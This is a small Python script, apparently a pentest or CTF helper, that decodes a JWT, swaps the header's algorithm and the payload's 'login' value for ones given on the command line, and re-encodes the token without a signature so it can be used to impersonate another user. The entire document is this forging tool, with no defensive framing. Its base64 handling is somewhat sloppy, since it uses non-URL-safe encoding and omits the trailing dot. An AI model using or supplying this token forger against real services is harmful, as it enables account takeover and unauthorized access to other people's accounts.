#!/bin/python3
import base64
import json
import re
import sys

# method for extracting JSON JWT TOKEN VALUES
def extract_jwt_vals(token_vals):
    return [ json.loads(i) for i in token_vals if re.findall('^{.*}$', i)]

# method for decoding JWT TOKEN
def decode_jwt(jwt_t):
    return [base64.b64decode(i+"="*3).decode('latin-1') \
                 for i in jwt_t.split('.')]

# method for encoding tampered JWT TOKEN in base64
def encode_string(dat):
    return base64.b64encode(json.dumps(dat[0]).encode('latin-1'))\
        .decode('latin-1').replace('=','') + '.' \
        + base64.b64encode(json.dumps(dat[1]).encode('latin-1'))\
        .decode('latin-1').replace('=','')
    
def main():

    jwt_t=sys.argv[1]
    alg=sys.argv[2]
    login=sys.argv[3]
    
    token_vals=decode_jwt(jwt_t)
    dat=extract_jwt_vals(token_vals)

    print(f'\n\nDecoded msg: {dat[0]}.{dat[1]}.{token_vals[2]}\n')    
    
    dat[0]['alg']=alg
    dat[1]['login']=login
    final_val=encode_string(dat)

    print(f'Tampered msg: {dat[0]}.{dat[1]}\n') 
    print(f'Original msg: {jwt_t}\n')
    print(f'Tampered JWT: {final_val}')

if __name__=='__main__':
	main()
